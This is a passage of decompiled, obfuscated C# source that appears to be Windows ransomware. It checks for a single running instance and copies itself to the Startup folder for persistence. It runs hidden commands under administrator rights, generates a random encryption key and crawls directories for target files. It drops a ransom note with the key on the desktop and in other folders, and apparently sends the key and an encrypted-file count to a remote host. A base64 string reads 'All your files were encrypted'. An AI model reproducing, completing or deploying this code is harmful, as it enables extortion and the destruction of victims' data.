					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(gDpoNjhTmVraF))
					{
						File.Delete(gDpoNjhTmVraF);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string WAdQAnaatuGbK;

	public static byte[] smKHsmzCQQJ;

	public static string LEpdgEkMnryDWG;

	public static string xpRslkPIZNkPFMe;

	public static List<string> veKjcfDmQAYZ;

	public static List<string> RYudWXnclT;

	public static string BgnlLuLqOz;

	public static string sYegfhFfwOKgPE;

	public static string PaVhfbLxCUlIiWK;

	public static string SsNNXOsHyBWIenb;

	public static int KqpMDdHLWmUkH;

	public static string EYxaInlnKpK;

	public static string BBuHVBrXwLa;

	public static string ioQYLomBXyIPev;

	public static string MMJbfQTrQc;

	public static string BytIIpyxDIyEs;

	public static string YEwFYxtdSZsAST;

	public static string JgxaqlKhVAqgR;

	public static string JKQAxAGQpoLcsE;

	public static List<string> sntjXMwdLKy;

	public static List<string> xtzwHGpcURO;

	public static string KolSXtENysFD;

	public static string baEpQVmPTeoPfx;

	public static string mDRSmgKFSau;

	public static List<string> PKEevhItGR;

	public static string FjCEaJsphNfpw;

	private static string UcRKDGBfJAusJI;

	public static string wGSokduaWV;

	public static string ljFbFcwSKT;

	public static List<string> mnMqgAfSusLgJ;

	public static List<string> nPlsLUdMzje;

	public static List<string> AlRVdSbJkGYahty;

	public static List<string> ANQRNsZXZzDia;

	public static string rJEEtUlxByvk;

	public static List<string> DYjGYBZIQrg;

	public static List<string> katNzSsTbLfO;

	public static string nCfehNnAKELxwv;

	public static string BHLDrOtOPouZ;

	internal static DateTime LYRWvlBeRbQQh;

	internal static DateTime fowfTrnwRbl;

	public static string EcxEPMzKnUKdFyvU;

	public static string tKbCgjZzNwIevCY;

	public static string RyOSKcyQJaZWDx;

	public static string VvRFlDNeHQT;

	public static string xNpEYwFApuwschUf;

	public static string AXGpYShsxoIVrP;

	public static string ngrBBoIkNa;

	public static string dtpyECacgdgV;

	public static List<string> MYtmFoSEPowjeCH;

	public static string YcDZJAXfkcwFEP;

	public static string QccyPlBKwOudBK;

	public static string IJtXsAfCJcow;

	public static string dgdSxQyeeVYCj;

	public static string vFffkfLzYWaM;

	public static string tHeSXcVDekJ;

	public static string dhGWzxSbIZAsoL;

	public static string ICyzqPsMrxcdu;

	public static string GGRvjiXEYRVi;

	public static string bstXhyBqhrxQeFG;

	public static string naHGmHncrAR;

	public static string xeCsreEMTvOV;

	public static string UPrMWpKHXIHX;

	public static string uimqVbzddVnUhZ;

	public static string UtITZwDYADzLfz;

	public static string sCxQBwaMOK;

	public static string YudXkRlgvT;

	public static string FAoZTEaQKffBRAH;

	public static string fkciLeUUejpnid;

	public static string mfDWFlrTLvSVI;

	public static string nApHZxDfPX;

	public static string XgJRdSkdEDwvbK;

	public static string dFwowAEqlw;

	public static string uoZercbfcm;

	public static string WwmvyHoShcYd;

	public static string tDBEEMFtqLOZz;

	public static string rrRVvypnQbGQM;

	public static string nGjBwexNCJl;

	public static string zClvTeYQjHuj;

	public static string[] JTojuxgSqdxwybF;

	public static string mLyGnpszUKM;

	public static bool jUTdQQEeFeYZhnmcv;

	public static string tPDMXsYnXhyKK;

	public static bool fpnZuwWWrCf;

	public static bool QuvIlKtixYqUmYGk;

	public static bool FYcbdFCfliPIkLX;

	public static bool snrxfLatiJx;

	public static string RqqYTsMuxEQen;

	public static bool AreaxgrYTj;

	public static bool qvKMXGNqEWEu;

	public static bool mXboGzoDiQU;

	public static bool YwGTeZrarTaZME;

	public static bool YBbHALckKieZ;

	public static string RXHFwPNHqsMjt;

	public static bool caDnjGzwLlwQ;

	public static Stopwatch OCOEXPhqFQnIzLf;

	public static int MtUrEdDRDzL;

	public static int YIvQxgIKBLMzUZ;

	public static bool XszgYccOIzBT;

	public static string HvklvwSSvrVzvZd;

	public static string[] sBysqOlvOkrR;

	public static List<string> MjFiqKPArxY;

	public static int MaXcOliCaNJoej;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			aatYNrgncXKld CS_0024_003C_003E8__locals0 = new aatYNrgncXKld();
			CS_0024_003C_003E8__locals0.RwIrhVjqaPReR = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.RwIrhVjqaPReR) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			UegAeYujoDEWE.CSrmlsQsVZwOGTp(UcRKDGBfJAusJI);
		}
		catch (Exception)
		{
		}
		try
		{
			if (tDBEEMFtqLOZz == getString_0(107396962))
			{
				Thread thread = new Thread(rPgpdPoZbn.ruqUmgYbbodonvHg);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (ioQYLomBXyIPev == getString_0(107396962))
		{
			Thread.Sleep(int.Parse(MMJbfQTrQc));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ngrBBoIkNa == getString_0(107396962))
		{
			try
			{
				IqPGnRnraqAeGLp(pimTPtzgsj(getString_0(107396957)));
			}
			catch
			{
			}
		}
		try
		{
			if (JgxaqlKhVAqgR == getString_0(107396962) && qBJlulozMUUY.xTWDNfjrOoKmy())
			{
				new pOcbdqQtgbmv().tAxJtIKkrFlcb(bool_0: false);
				qBJlulozMUUY.QlzurqdMbYoVt();
			}
		}
		catch (Exception)
		{
		}
		if (baEpQVmPTeoPfx == getString_0(107396962) && qBJlulozMUUY.xTWDNfjrOoKmy())
		{
			new pOcbdqQtgbmv().tAxJtIKkrFlcb(bool_0: false);
			new pOcbdqQtgbmv().vdKFgKSVCWgW();
		}
		if (BBuHVBrXwLa == getString_0(107396962))
		{
			nhgVJpXAFiPL.wdLkSLchTsHQMB();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396820);
			string text2 = text + Path.GetFileName(fileName);
			if (SsNNXOsHyBWIenb == getString_0(107396962) && fileName != text2)
			{
				Thread thread2 = new Thread(LcZcaSMHkUyMD);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (BgnlLuLqOz == getString_0(107396962) && mainModule != null && fileName != text2)
			{
				try
				{
					KqpMDdHLWmUkH = TMBDAzOGTPrALU(0, sntjXMwdLKy.Count);
					File.Copy(fileName, text + sntjXMwdLKy[KqpMDdHLWmUkH], overwrite: true);
					Process.Start(text + sntjXMwdLKy[KqpMDdHLWmUkH]);
					uXNwcPgUqXlzDEK();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (nCfehNnAKELxwv == getString_0(107396962) && DateTime.Now < LYRWvlBeRbQQh)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (BHLDrOtOPouZ == getString_0(107396962) && DateTime.Now > fowfTrnwRbl)
			{
				uXNwcPgUqXlzDEK();
			}
		}
		catch
		{
		}
		cvpygetWprQNd();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = nPlsLUdMzje;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						sYcbkIpQPZ(pimTPtzgsj(getString_0(107389081)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> alRVdSbJkGYahty = AlRVdSbJkGYahty;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						sYcbkIpQPZ(pimTPtzgsj(getString_0(107389100)), string_0);
					};
				}
				Parallel.ForEach(alRVdSbJkGYahty, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (zClvTeYQjHuj == getString_0(107396962))
				{
					string[] jTojuxgSqdxwybF = JTojuxgSqdxwybF;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							sYcbkIpQPZ(pimTPtzgsj(getString_0(107389100)), getString_0(107389043) + string_0 + getString_0(107389066));
						};
					}
					Parallel.ForEach(jTojuxgSqdxwybF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!oPrbscpupajC().Contains(getString_0(107389261)))
				{
					amlUMUnhkwAkBpE(rJEEtUlxByvk);
				}
				else
				{
					List<string> aNQRNsZXZzDia = ANQRNsZXZzDia;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							sYcbkIpQPZ(pimTPtzgsj(zujFUufZIGQ(getString_0(107389061))), string_0);
						};
					}
					Parallel.ForEach(aNQRNsZXZzDia, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> dYjGYBZIQrg = DYjGYBZIQrg;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						sYcbkIpQPZ(pimTPtzgsj(getString_0(107389548)), string_0);
					};
				}
				Parallel.ForEach(dYjGYBZIQrg, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (UPrMWpKHXIHX == getString_0(107396815))
		{
			WgxFctbldNaI();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FYcbdFCfliPIkLX)
			{
				try
				{
					Thread thread4 = new Thread(iFmnmYYiOrDs.AUloqXDohL);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			sYcbkIpQPZ(getString_0(107396842), pimTPtzgsj(getString_0(107396829)));
		}
		SecureString secureString = new SecureString();
		if (RyOSKcyQJaZWDx == getString_0(107396815))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			sYegfhFfwOKgPE = getString_0(107396724);
		}
		PaVhfbLxCUlIiWK = mIIgQsRoPFcf.lAQgyDpGyMnN(VEQFUDBaHXuuW(secureString));
		if (ICyzqPsMrxcdu == getString_0(107396962))
		{
			VtTmhvampUSyVgr();
		}
		if (mXboGzoDiQU)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), RXHFwPNHqsMjt)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), RXHFwPNHqsMjt), string.Concat(pimTPtzgsj(getString_0(107397223)), new WebClient().DownloadString(pimTPtzgsj(getString_0(107397166))), getString_0(107397157), pimTPtzgsj(getString_0(107397152)), DateTime.Now, getString_0(107397157), pimTPtzgsj(getString_0(107397079)), PaVhfbLxCUlIiWK));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), RXHFwPNHqsMjt), getString_0(107397054) + PaVhfbLxCUlIiWK);
				}
			}
			catch (Exception ex7)
			{
				if (AreaxgrYTj)
				{
					try
					{
						File.AppendAllText(RqqYTsMuxEQen, getString_0(107397025) + ex7.Message + getString_0(107397157));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		PFCehEQzezFGypOL.PMUgFOwBInnBBN(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), mfDWFlrTLvSVI), ONGCxVfakzQxo(PaVhfbLxCUlIiWK), null, null, getString_0(107396432), getString_0(107396447), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			emnPkYoZutnz();
		}
		try
		{
			try
			{
				if (caDnjGzwLlwQ)
				{
					Console.WriteLine(getString_0(107396398));
				}
			}
			catch
			{
			}
			ouHzjVUHpzne(new string[1] { getString_0(107396381) }, new string[100]
			{
				getString_0(107396340),
				getString_0(107396335),
				getString_0(107396362),
				getString_0(107396353),
				getString_0(107396316),
				getString_0(107396311),
				getString_0(107396306),
				getString_0(107396301),
				getString_0(107396328),
				getString_0(107396323),
				getString_0(107396318),
				getString_0(107396281),
				getString_0(107396272),
				getString_0(107396299),
				getString_0(107396290),
				getString_0(107396285),
				getString_0(107396248),
				getString_0(107396243),
				getString_0(107396238),
				getString_0(107396265),
				getString_0(107396256),
				getString_0(107396219),
				getString_0(107396214),
				getString_0(107396209),
				getString_0(107396236),
				getString_0(107396231),
				getString_0(107396226),
				getString_0(107396221),
				getString_0(107396696),
				getString_0(107396691),
				getString_0(107396686),
				getString_0(107396713),
				getString_0(107396708),
				getString_0(107396703),
				getString_0(107396662),
				getString_0(107396657),
				getString_0(107396684),
				getString_0(107396679),
				getString_0(107396306),
				getString_0(107396674),
				getString_0(107396328),
				getString_0(107396633),
				getString_0(107396628),
				getString_0(107396623),
				getString_0(107396650),
				getString_0(107396645),
				getString_0(107396640),
				getString_0(107396603),
				getString_0(107396598),
				getString_0(107396593),
				getString_0(107396620),
				getString_0(107396615),
				getString_0(107396610),
				getString_0(107396605),
				getString_0(107396568),
				getString_0(107396563),
				getString_0(107396558),
				getString_0(107396585),
				getString_0(107396576),
				getString_0(107396539),
				getString_0(107396530),
				getString_0(107396549),
				getString_0(107396674),
				getString_0(107396504),
				getString_0(107396495),
				getString_0(107396518),
				getString_0(107396509),
				getString_0(107396468),
				getString_0(107396491),
				getString_0(107396486),
				getString_0(107396477),
				getString_0(107395924),
				getString_0(107395947),
				getString_0(107395942),
				getString_0(107395937),
				getString_0(107395900),
				getString_0(107395895),
				getString_0(107395890),
				getString_0(107395885),
				getString_0(107395908),
				getString_0(107395903),
				getString_0(107395866),
				getString_0(107395861),
				getString_0(107395856),
				getString_0(107395883),
				getString_0(107395874),
				getString_0(107395833),
				getString_0(107395828),
				getString_0(107396708),
				getString_0(107395823),
				getString_0(107395850),
				getString_0(107395845),
				getString_0(107395840),
				getString_0(107395803),
				getString_0(107395794),
				getString_0(107395789),
				getString_0(107395816),
				getString_0(107395807),
				getString_0(107395770),
				getString_0(107395765)
			}, new string[0], VEQFUDBaHXuuW(secureString), getString_0(107395760));
		}
		catch (Exception ex9)
		{
			if (AreaxgrYTj)
			{
				try
				{
					File.AppendAllText(RqqYTsMuxEQen, getString_0(107395775) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750));
				streamWriter.WriteLine(pimTPtzgsj(getString_0(107395717)));
				streamWriter.WriteLine(getString_0(107397157));
				streamWriter.WriteLine(pimTPtzgsj(getString_0(107392683)));
				streamWriter.WriteLine(PaVhfbLxCUlIiWK);
				if (wGSokduaWV == getString_0(107396815))
				{
					streamWriter.WriteLine(getString_0(107397157));
					streamWriter.WriteLine(pimTPtzgsj(getString_0(107392650)) + Convert.ToString(PKEevhItGR.Count));
				}
				if (XszgYccOIzBT)
				{
					streamWriter.WriteLine(getString_0(107397157));
					streamWriter.WriteLine(pimTPtzgsj(getString_0(107393085)));
					streamWriter.WriteLine(aOlPpFtnUBXreNv.FqqRnlVwFEkGH());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750));
				if (!text3.Contains(PaVhfbLxCUlIiWK) && !fpnZuwWWrCf)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750), getString_0(107393020) + PaVhfbLxCUlIiWK);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in xtzwHGpcURO)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395750)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750), item + getString_0(107395750), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750));
					if (!text4.Contains(PaVhfbLxCUlIiWK) && !fpnZuwWWrCf)
					{
						File.AppendAllText(item + getString_0(107395750), getString_0(107393020) + PaVhfbLxCUlIiWK);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!snrxfLatiJx && num > 10)
			{
				break;
			}
		}
		if (dFwowAEqlw == getString_0(107396962))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393023)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393023));
					streamWriter2.WriteLine(pimTPtzgsj(getString_0(107392990)));
					streamWriter2.WriteLine(getString_0(107397157));
					streamWriter2.WriteLine(pimTPtzgsj(getString_0(107392941)));
					streamWriter2.WriteLine(PaVhfbLxCUlIiWK + pimTPtzgsj(getString_0(107392340)));
					if (wGSokduaWV == getString_0(107396815))
					{
						streamWriter2.WriteLine(getString_0(107397157));
						streamWriter2.WriteLine(pimTPtzgsj(getString_0(107392359)) + pimTPtzgsj(getString_0(107392650)) + Convert.ToString(PKEevhItGR.Count) + pimTPtzgsj(getString_0(107392340)));
					}
					if (XszgYccOIzBT)
					{
						streamWriter2.WriteLine(getString_0(107397157));
						streamWriter2.WriteLine(pimTPtzgsj(getString_0(107393085)));
						streamWriter2.WriteLine(aOlPpFtnUBXreNv.FqqRnlVwFEkGH());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750));
					if (!text5.Contains(PaVhfbLxCUlIiWK) && !fpnZuwWWrCf)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393023), pimTPtzgsj(getString_0(107392359)) + getString_0(107393020) + PaVhfbLxCUlIiWK + pimTPtzgsj(getString_0(107392340)));
					}
				}
			}
			catch
			{
			}
		}
		if (FjCEaJsphNfpw == getString_0(107396962))
		{
			try
			{
				if (wGSokduaWV == getString_0(107396815))
				{
					aOlPpFtnUBXreNv.VaQowyqahZf(getString_0(107392298), getString_0(107392293), getString_0(107392248), string.Concat(pimTPtzgsj(getString_0(107397223)), new WebClient().DownloadString(pimTPtzgsj(getString_0(107397166))), getString_0(107392239), pimTPtzgsj(getString_0(107397152)), DateTime.Now, getString_0(107397157), pimTPtzgsj(getString_0(107392266)), Convert.ToString(PKEevhItGR.Count), getString_0(107397157), pimTPtzgsj(getString_0(107397079)), PaVhfbLxCUlIiWK));
				}
				else
				{
					aOlPpFtnUBXreNv.VaQowyqahZf(getString_0(107392298), getString_0(107392293), getString_0(107392248), string.Concat(pimTPtzgsj(getString_0(107397223)), new WebClient().DownloadString(pimTPtzgsj(getString_0(107397166))), getString_0(107392239), pimTPtzgsj(getString_0(107397152)), DateTime.Now, getString_0(107397157), pimTPtzgsj(getString_0(107392266)), Convert.ToString(PKEevhItGR.Count), getString_0(107397157), pimTPtzgsj(getString_0(107397079)), PaVhfbLxCUlIiWK));
				}
			}
			catch
			{
			}
		}
		if (JKQAxAGQpoLcsE == getString_0(107396962))
		{
			try
			{
				dZIjGhtorza.PhqjFEJyaUBii(new Uri(getString_0(107392185)));
			}
			catch
			{
			}
		}
		if (dFwowAEqlw == getString_0(107396815))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750)))
				{
					Process.Start(pimTPtzgsj(getString_0(107392184)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395750));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393023)))
				{
					Process.Start(pimTPtzgsj(getString_0(107392191)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393023));
				}
			}
			catch
			{
			}
		}
		if (ICyzqPsMrxcdu == getString_0(107396962))
		{
			if (GGRvjiXEYRVi == getString_0(107396962) && !string.IsNullOrEmpty(bstXhyBqhrxQeFG) && !string.IsNullOrEmpty(naHGmHncrAR))
			{
				PQTABozyIZQ(bstXhyBqhrxQeFG, naHGmHncrAR);
			}
			else
			{
				PQTABozyIZQ(getString_0(107392142), getString_0(107392113));
			}
		}
		if (YudXkRlgvT != getString_0(107392423))
		{
			PMioaazULTCeJ(YudXkRlgvT);
		}
		if (!string.IsNullOrEmpty(tHeSXcVDekJ))
		{
			try
			{
				File.Delete(tHeSXcVDekJ);
			}
			catch
			{
			}
		}
		if (AreaxgrYTj)
		{
			try
			{
				File.AppendAllText(RqqYTsMuxEQen, getString_0(107392374));
			}
			catch (Exception)
			{
			}
		}
		if (WAdQAnaatuGbK == getString_0(107392393))
		{
			uXNwcPgUqXlzDEK();
		}
	}

	public static void LcZcaSMHkUyMD()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(pimTPtzgsj(getString_0(107392384)), pimTPtzgsj(getString_0(107392142)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int TMBDAzOGTPrALU(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> qmaUyiFdTCxwxy(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107391718)) && !text.Contains(getString_0(107391661)) && !text.Contains(getString_0(107391660)) && !text.ToLower().Contains(getString_0(107391611)) && !text.ToLower().Contains(getString_0(107391598)) && !text.Contains(getString_0(107392085)) && !text.Contains(getString_0(107392096)) && !text.ToLower().Contains(getString_0(107392051)) && !text.ToLower().Contains(getString_0(107392070)) && !text.ToLower().Contains(getString_0(107392033)) && !text.ToLower().Contains(getString_0(107391992)) && !text.ToLower().Contains(getString_0(107392007)) && !text.ToLower().Contains(getString_0(107391962)) && !text.ToLower().Contains(getString_0(107391949)) && !text.ToLower().Contains(getString_0(107391928)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107391935)) && !fileInfo.FullName.Contains(getString_0(107391886)) && !fileInfo.FullName.Contains(getString_0(107391901)) && !fileInfo.FullName.Contains(getString_0(107391884)) && !fileInfo.FullName.Contains(getString_0(107391323)) && !fileInfo.FullName.Contains(getString_0(107391338)) && !fileInfo.FullName.Contains(getString_0(107391289)) && !fileInfo.FullName.Contains(getString_0(107391304)) && !fileInfo.FullName.Contains(getString_0(107391259)) && !fileInfo.FullName.Contains(getString_0(107391270)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391225)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391244)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391195)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391210)) && !fileInfo.FullName.Contains(pimTPtzgsj(getString_0(107391161))) && !fileInfo.FullName.Contains(getString_0(107391168)) && !fileInfo.FullName.Contains(getString_0(107391123)) && !fileInfo.FullName.Contains(getString_0(107391138)) && !fileInfo.FullName.EndsWith(getString_0(107395760)) && !fileInfo.FullName.EndsWith(getString_0(107391113)) && !fileInfo.FullName.EndsWith(getString_0(107391108)) && !fileInfo.FullName.EndsWith(getString_0(107391103)) && !fileInfo.FullName.EndsWith(getString_0(107391578)) && !fileInfo.FullName.Contains(getString_0(107391573)) && !fileInfo.FullName.Contains(mfDWFlrTLvSVI) && !fileInfo.FullName.Contains(RqqYTsMuxEQen) && !fileInfo.FullName.Contains(RXHFwPNHqsMjt))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(xpRslkPIZNkPFMe) * 1024.0 * 1024.0 && LEpdgEkMnryDWG == getString_0(107396962))
						{
							list.Add(fileInfo.FullName);
							ZpSdEiAVGu(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && LEpdgEkMnryDWG == getString_0(107396815))
						{
							list.Add(fileInfo.FullName);
							ZpSdEiAVGu(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void WgxFctbldNaI()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391588));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!veKjcfDmQAYZ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391503), getString_0(107396820)).Replace(getString_0(107391530), getString_0(107391503))
					.Replace(getString_0(107391521), getString_0(107392185))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					veKjcfDmQAYZ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391503), getString_0(107396820)).Replace(getString_0(107391530), getString_0(107391503))
						.Replace(getString_0(107391521), getString_0(107392185))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391484), getString_0(107392185)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string sYcbkIpQPZ(string QwXCvVLtBMp = "", string SenQFCSjaouZBSrncj = "")
	{
		string result = getString_0(107392185);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = QwXCvVLtBMp,
				Arguments = SenQFCSjaouZBSrncj,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void IqPGnRnraqAeGLp(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107391475),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string zujFUufZIGQ(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string pimTPtzgsj(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void xdbQsATiGDTY(string gRLXTjVjnsxLGLV = "", string FQyLwdpedieIFqg = "SW5mb3JtYXRpb24uLi4=", string eOASqkRWASfMzD = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		gRLXTjVjnsxLGLV = zujFUufZIGQ(getString_0(107391490));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(pimTPtzgsj(gRLXTjVjnsxLGLV), writable: true);
			if (registryKey != null)
			{
